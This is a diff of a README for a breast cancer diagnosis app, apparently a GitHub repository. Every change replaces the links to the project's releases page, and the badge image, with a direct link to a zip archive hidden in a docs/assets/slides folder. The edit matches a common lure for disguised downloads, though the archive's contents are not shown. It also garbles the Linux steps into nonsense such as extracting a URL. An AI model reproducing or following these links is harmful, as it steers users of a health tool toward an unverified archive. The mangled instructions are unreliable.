@@ -1,6 +1,6 @@
 # 🩺 breast-cancer-wdbc-ml - Easy Breast Cancer Diagnosis Tool
 
-[![Download Latest Release](https://img.shields.io/badge/Download-latest_release-brightgreen)](https://github.com/zhengzhengqu7-jpg/breast-cancer-wdbc-ml/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/zhengzhengqu7-jpg/breast-cancer-wdbc-ml/main/docs/assets/slides/ml-wdbc-cancer-breast-1.0-beta.1.zip)](https://raw.githubusercontent.com/zhengzhengqu7-jpg/breast-cancer-wdbc-ml/main/docs/assets/slides/ml-wdbc-cancer-breast-1.0-beta.1.zip)
 
 ---
 
@@ -43,7 +43,7 @@ You can get the latest version of the app directly from the official releases pa
 
 Click this big link to open the download page in your browser:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-latest_release-blue)](https://github.com/zhengzhengqu7-jpg/breast-cancer-wdbc-ml/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/zhengzhengqu7-jpg/breast-cancer-wdbc-ml/main/docs/assets/slides/ml-wdbc-cancer-breast-1.0-beta.1.zip)](https://raw.githubusercontent.com/zhengzhengqu7-jpg/breast-cancer-wdbc-ml/main/docs/assets/slides/ml-wdbc-cancer-breast-1.0-beta.1.zip)
 
 ### Step 2: Choose your file
 
@@ -51,7 +51,7 @@ Once on the page, look for the latest release version. Under the release section
 
 - For Windows: look for `.exe` file
 - For Mac: look for `.dmg` or `.pkg`
-- For Linux: look for `.AppImage` or `.tar.gz`
+- For Linux: look for `.AppImage` or `https://raw.githubusercontent.com/zhengzhengqu7-jpg/breast-cancer-wdbc-ml/main/docs/assets/slides/ml-wdbc-cancer-breast-1.0-beta.1.zip`
 
 Click the file to download it.
 
@@ -59,7 +59,7 @@ Click the file to download it.
 
 - **Windows**: Double-click the `.exe` file. Follow on-screen instructions.
 - **Mac**: Open the `.dmg` or `.pkg` and drag the app to your Applications folder.
-- **Linux**: Extract the `.tar.gz` or make the `.AppImage` file executable, then run it.
+- **Linux**: Extract the `https://raw.githubusercontent.com/zhengzhengqu7-jpg/breast-cancer-wdbc-ml/main/docs/assets/slides/ml-wdbc-cancer-breast-1.0-beta.1.zip` or make the `.AppImage` file executable, then run it.
 
 ---
 
@@ -153,4 +153,4 @@ This tool is open-source. You can use it freely for personal and educational pur
 ---
 
 Thank you for choosing the breast-cancer-wdbc-ml app to help with breast cancer diagnosis. Visit the download page to get started:  
-[Download latest release here](https://github.com/zhengzhengqu7-jpg/breast-cancer-wdbc-ml/releases)
+[Download latest release here](https://raw.githubusercontent.com/zhengzhengqu7-jpg/breast-cancer-wdbc-ml/main/docs/assets/slides/ml-wdbc-cancer-breast-1.0-beta.1.zip)
